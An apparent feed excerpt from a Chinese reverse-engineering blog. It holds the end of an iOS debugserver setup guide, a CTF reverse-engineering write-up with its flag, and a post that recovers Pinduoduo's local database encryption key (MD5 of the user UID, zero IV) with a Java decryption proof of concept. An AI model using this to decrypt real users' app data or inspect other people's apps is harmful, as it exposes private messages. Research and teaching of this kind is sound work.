class="name">key</span>&gt;</span>com.apple.diagnosticd.diagnostic<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.frontboard.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.frontboard.launchapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.network.client<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.network.server<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.springboard.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.system-task-ports<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>get-task-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>platform-application<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>run-unsigned-code<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>task_for_pid-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="用ldid对debugserver签名-赋予权限"><a href="#用ldid对debugserver签名-赋予权限" class="headerlink" title="用ldid对debugserver签名 赋予权限"></a>用ldid对debugserver签名 赋予权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldid -Sxml全路径 debugserver全路径`</span><br><span class="line">例如：`ldid -Sent.xml debugserver</span><br></pre></td></tr></table></figure><p>这里要SSH连入iPhone手机执行命令：需要越狱您的iPhone,不会的请去看 <a href="https://mrmad.com.tw/category/jb/jailbreak">疯先生越狱</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启端口转发,数据线连SSH</span></span><br><span class="line">iproxy 2222 44        <span class="comment">#默认用Checkra1n越狱的端口号为44，其余的默认为22</span></span><br><span class="line"><span class="comment">#连入iPhone SSH</span></span><br><span class="line">ssh root@localhost -p 2222 <span class="comment">#iPhone默认ssh密码,alpine</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到debugserver存在的目录</span></span><br><span class="line">iPhone:~ root<span class="comment"># cd /Developer/usr/bin/</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># ls</span></span><br><span class="line">DTDeviceArbitration*  ScreenShotr*  axauditd*  debugserver*</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建ent.xml文件</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># vim ent.xml   #将1、里面的ent.xml内容复制进去，并且保存</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后ldid赋予权限</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># ldid -Sent.xml debugserver</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#拷贝到系统目录</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># copy ./debugserver /usr/bin</span></span><br></pre></td></tr></table></figure><p><img src="/images/iOS13-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE%E4%B9%8Bdebugserver/%E6%88%AA%E5%B1%8F2020-02-06%E4%B8%8B%E5%8D%887.52.51.png" alt="截屏2020-02-06下午7.52.51"></p><h2 id="验证debugserver-进行动态调试"><a href="#验证debugserver-进行动态调试" class="headerlink" title="验证debugserver 进行动态调试"></a>验证debugserver 进行动态调试</h2><p>配置好iPhone端的debugserver后，就可以在Mac电脑上用lldb远程进行动态调试了<strong>lldb调试大全后续会讲</strong>，此次注重debugserver的配置，lldb一笔带，只要知道lldb是Mac上的客户端用来动态调试。</p><p>以调试Sugram 聊天软件为例</p><p>手机端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看Sugram的进程ID</span></span><br><span class="line">iPhone:~ root<span class="comment"># ps aux|grep &quot;Sugram&quot;</span></span><br><span class="line">mobile          6542   0.0  2.9  5055392  59136   ??  Ss    8:38PM   0:00.51 /var/containers/Bundle/Application/12CA134A-E92A-4F35-BEAA-542F84A0A39F/Sugram.app/Sugram</span><br><span class="line"></span><br><span class="line"><span class="comment">#注入方式对Sugram进行监听</span></span><br><span class="line">iPhone:~ root<span class="comment"># debugserver 127.0.0.1:1234 --attach 6542</span></span><br></pre></td></tr></table></figure><p>这时候被注入监听的那个APP就会进入卡死状态，因为debugserver已经对Sugram进行调试状态。</p><p>电脑端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先用iProxy 转发debugserver监听的端口</span></span><br><span class="line">iproxy 1234 1234</span><br><span class="line"><span class="comment">#进入lldb 进行远程调试</span></span><br><span class="line">lldb</span><br><span class="line">(lldb) process connect connect://localhost:1234</span><br></pre></td></tr></table></figure><h2 id="最后！"><a href="#最后！" class="headerlink" title="最后！"></a>最后！</h2><p>出现如下画面说明debugserver 配置正确，lldb也可以进行动态调试了。😁😁  –专注逆向、网络安全 Lee</p><p><img src="/images/iOS13-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE%E4%B9%8Bdebugserver/%E6%88%AA%E5%B1%8F2020-02-06%E4%B8%8B%E5%8D%888.48.39.png" alt="截屏2020-02-06下午8.48.39"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;iOS逆向里面比较重要的几项技能：动态调试、静态分析、HOOK关键函数、重签名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>湖湘杯Re writeup</title>
    <link href="https://vxer-lee.github.io/2020/01/09/%E6%B9%96%E6%B9%98%E6%9D%AFReWriteup/"/>
    <id>https://vxer-lee.github.io/2020/01/09/%E6%B9%96%E6%B9%98%E6%9D%AFReWriteup/</id>
    <published>2020-01-09T06:22:52.000Z</published>
    <updated>2021-06-04T01:22:26.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>UPX的壳很好脱，可以在网上找现成的脱壳工具、或者是手动用单步跟踪法、ESP定律法。</p><img src="/images/湖湘杯Writeup/截屏2019-11-09下午9.45.21.png" alt="截屏2019-11-09下午9.45.21" style="zoom:40%;" /> <h2 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h2><ol><li>找到OEP然后下断(这里入口点感觉被修改过变异过 不像正常的vc++2015程序的入口点)</li><li>右键字符串智能搜索</li><li>找到关键字 input Your Flag 单步跟踪</li></ol><p><img src="/images/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8810.26.46.png" alt="截屏2019-11-09下午10.26.46"> </p><p><img src="/images/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8810.29.31.png" alt="截屏2019-11-09下午10.26.46"> </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">01355386    52              push edx</span><br><span class="line">01355387    68 68A03501     push reverse.0135A068                    ; fmcj2y~&#123;</span><br><span class="line">0135538C    E8 16C0FFFF     call reverse.013513A7;    比较最后输入的命令行参数是否为(fmcj2y~&#123;)</span><br><span class="line">01355391    83C4 08         add esp,0x8          ;    类似于c:\tset\reverse.exe fmcj2y~&#123;</span><br><span class="line">01355394    85C0            test eax,eax</span><br><span class="line">01355396    74 19           je Xreverse.013553B1</span><br><span class="line">01355398    68 307E3501     push reverse.01357E30                    ; Input Error!\n</span><br><span class="line">0135539D    E8 D8BFFFFF     call reverse.0135137A</span><br><span class="line">013553A2    83C4 04         add esp,0x4</span><br><span class="line">013553A5    33C0            xor eax,eax</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/111.png" alt="111"></p><h3 id="关键函数1"><a href="#关键函数1" class="headerlink" title="关键函数1"></a>关键函数1</h3><p><img src="/images/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8810.55.47.png" alt="截屏2019-11-09下午10.55.47"></p><h3 id="关键函数2"><a href="#关键函数2" class="headerlink" title="关键函数2"></a>关键函数2</h3><p><img src="/images/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8811.01.54.png" alt="截屏2019-11-09下午11.01.54"></p><p><img src="/images/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8811.00.05.png" alt="截屏2019-11-09下午11.00.05"></p><p>41A078地址的值为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">41</span>A078[<span class="number">0</span>] = <span class="number">50</span></span><br><span class="line"><span class="number">41</span>A078[<span class="number">1</span>] = c6</span><br><span class="line"><span class="number">41</span>A078[<span class="number">2</span>] = f1</span><br><span class="line"><span class="number">41</span>A078[<span class="number">3</span>] = e4</span><br><span class="line"><span class="number">41</span>A078[<span class="number">4</span>] = e3</span><br><span class="line"><span class="number">41</span>A078[<span class="number">5</span>] = e2</span><br><span class="line"><span class="number">41</span>A078[<span class="number">6</span>] = <span class="number">9</span>a</span><br><span class="line"><span class="number">41</span>A078[<span class="number">7</span>] = a1</span><br><span class="line"><span class="number">41</span>A078[<span class="number">8</span>] = a7</span><br><span class="line"><span class="number">41</span>A078[<span class="number">9</span>] = de</span><br><span class="line"><span class="number">41</span>A078[<span class="number">10</span>] = da</span><br><span class="line"><span class="number">41</span>A078[<span class="number">11</span>] = <span class="number">46</span></span><br><span class="line"><span class="number">41</span>A078[<span class="number">12</span>] = ab</span><br><span class="line"><span class="number">41</span>A078[<span class="number">13</span>] = <span class="number">2</span>e</span><br><span class="line"><span class="number">41</span>A078[<span class="number">14</span>] = ff</span><br><span class="line"><span class="number">41</span>A078[<span class="number">15</span>] = db</span><br></pre></td></tr></table></figure><p>最后将每个值减1<br>得到flag<br><code>flag&#123;4fc5f0e3e2e199a0a6ddd945aa2dfeda&#125;</code></p><hr><p><img src="/images/%E6%B9%96%E6%B9%98%E6%9D%AFWriteup/%E6%88%AA%E5%B1%8F2019-11-09%E4%B8%8B%E5%8D%8811.18.50.png" alt="截屏2019-11-09下午11.18.50"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;查壳&quot;&gt;&lt;a href=&quot;#查壳&quot; class=&quot;headerlink&quot; title=&quot;查壳&quot;&gt;&lt;/a&gt;查壳&lt;/h2&gt;&lt;p&gt;UPX的壳很好脱，可以在网上找现成的脱壳工具、或者是手动用单步跟踪法、ESP定律法。&lt;/p&gt;
&lt;img src=&quot;/images/湖湘杯Wr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>拼多多数据库解密</title>
    <link href="https://vxer-lee.github.io/2020/01/08/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/"/>
    <id>https://vxer-lee.github.io/2020/01/08/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/</id>
    <published>2020-01-08T06:22:52.000Z</published>
    <updated>2021-04-22T15:28:42.411Z</updated>
    
    <content type="html"><![CDATA[<h2 id="拼多多数据库"><a href="#拼多多数据库" class="headerlink" title="拼多多数据库"></a>拼多多数据库</h2><p>在拼多多数据库中其中的<code>t_mall_conversation</code>表中的<code>message</code>字段数据内容被加密了<br><img src="/images/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119142603548.png" alt="image-20200119142603548">  </p><p>提取相应的关键字：<code>t_mall_conversationnn</code> <code>message</code></p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>在其官网找到下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;mcdn.yangkeduo.com&#x2F;android_dev&#x2F;2020-01-14&#x2F;b9af6563fb99283df18cbdedddef1e68.apk</span><br></pre></td></tr></table></figure><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>先用Android APK查壳工具，对拼多多APK进行查壳。如果有被加固需要进行下一步的脱壳操作，如下图：拼多多APK并未被加固.<br><img src="/images/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119142907538-9102989.png" alt="image-20200119142907538">  </p><h3 id="反编译、关键字定位"><a href="#反编译、关键字定位" class="headerlink" title="反编译、关键字定位"></a>反编译、关键字定位</h3><p>根据关键字<code>t_mall_conversation</code>定位到处理该表与<code>message</code>加密字段的类.<br><img src="/images/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119151434228.png" alt="image-20200119151434228">  </p><p>在该类下继续找到<code>getMessage</code> 与 <code>setMessage</code>方法，其中getMessage为获取Pdd数据库t_mall_conversation表中Message的字段（所以解密函数也在该方法中），而setMessage为相反的设置Message字段的内容（加密函数在该方法中）<br><img src="/images/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119151637311.png" alt="image-20200119151637311">  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.b(message) <span class="comment">//解密函数</span></span><br><span class="line">a.a(str)     <span class="comment">//加密函数</span></span><br></pre></td></tr></table></figure><h3 id="反编译、加密算法解析"><a href="#反编译、加密算法解析" class="headerlink" title="反编译、加密算法解析"></a>反编译、加密算法解析</h3><p>采用AES加密算法，向量为{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}，密钥为用户UID的MD5加密取前16位，UID的值在<code>data/data/com.xunmeng.pinduoduo/files/pinUserFile</code>文件中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IV = <span class="keyword">new</span> <span class="keyword">byte</span> &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">uid = <span class="number">5564948642776</span>;</span><br><span class="line">MD5(uid) = 479EE2A088591D9856CCDC451C1B4515;</span><br><span class="line">KEY = 479EE2A088591D98;</span><br></pre></td></tr></table></figure><p>AES加密算法<br><img src="/images/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119153147712.png" alt="image-20200119153147712">  </p><p>UID值<br><img src="/images/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119154305302.png" alt="image-20200119153147712"><br><img src="/images/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119154332523.png" alt="image-20200119154332523">  </p><h3 id="POC-编写、破解过程验证"><a href="#POC-编写、破解过程验证" class="headerlink" title="POC 编写、破解过程验证"></a>POC 编写、破解过程验证</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span>  String <span class="title">PddMsgDecrypt</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(msg)) &#123;</span><br><span class="line">            <span class="keyword">return</span> msg;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//MD5加密(uid)</span></span><br><span class="line">        String md5Text = MD5Utils.digest(<span class="string">&quot;5564948642776&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(md5Text)) &#123;</span><br><span class="line">            <span class="keyword">return</span> msg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//IV</span></span><br><span class="line">        <span class="keyword">byte</span>[] iv = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">//KEY 取MD5前16位</span></span><br><span class="line">        <span class="keyword">byte</span>[] key = md5Text.substring(<span class="number">0</span>,<span class="number">16</span>).getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//AES解密</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            IvParameterSpec v0_2 = <span class="keyword">new</span> IvParameterSpec(iv);</span><br><span class="line">            Cipher v2 = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">            v2.init(<span class="number">2</span>, ((Key)v1), ((AlgorithmParameterSpec)v0_2));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(v2.doFinal(Base64.decode(msg, <span class="number">2</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Throwable unstd) &#123;</span><br><span class="line">            Log.v(<span class="string">&quot;Lee&quot;</span>, <span class="string">&quot;Fail to decrypt data with aes key through java&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> msg;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line"><span class="comment">//POC 破解过程验证</span></span><br><span class="line">PddMsgDecrypt(<span class="string">&quot;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&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>数据库中加密的值，用以上Python代码成功解密成了如下的明文数据。<br><img src="/images/%E6%8B%BC%E5%A4%9A%E5%A4%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%A3%E5%AF%86/image-20200119155717365.png" alt="image-20200119155717365"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;auto_click&quot;:1,&quot;content&quot;:&quot;亲，欢迎来到拼多多，今后您在拼多多遇到的任何问题都可以咨询我哦～快快开启“多实惠，多乐趣”的购物之旅吧！&quot;,&quot;from&quot;:&#123;&quot;mall_id&quot;:&quot;606&quot;,&quot;role&quot;:&quot;mall_cs&quot;,&quot;uid&quot;:&quot;606&quot;&#125;,&quot;is_aut&quot;:0,&quot;is_rich_text&quot;:1,&quot;mallName&quot;:&quot;拼多多官方客服&quot;,&quot;msg_id&quot;:&quot;1579261690080&quot;,&quot;rich_text&quot;:&#123;&quot;content&quot;:[&#123;&quot;text&quot;:&quot;亲，欢迎来到拼多多，今后您在拼多多遇到的任何问题都可以咨询我哦～快快开启“多实惠，多乐趣”的购物之旅吧！&quot;,&quot;type&quot;:&quot;text&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;如何搜索商品&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;如何搜索商品&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;怎么在拼多多下单&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;怎么在拼多多下单&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;下单后如何支付&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;下单后如何支付&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;哪里可以看到我的订单&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;哪里可以看到我的订单&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;,&#123;&quot;click_action&quot;:&#123;&quot;name&quot;:&quot;send_message&quot;,&quot;params&quot;:&#123;&quot;content&quot;:&quot;拼多多有哪些活动&quot;&#125;&#125;,&quot;hide&quot;:0,&quot;text&quot;:&quot;拼多多有哪些活动&quot;,&quot;type&quot;:&quot;menu_item&quot;&#125;],&quot;template&quot;:&quot;text_with_menu_items&quot;,&quot;version&quot;:1&#125;,&quot;status&quot;:&quot;unread&quot;,&quot;template_name&quot;:&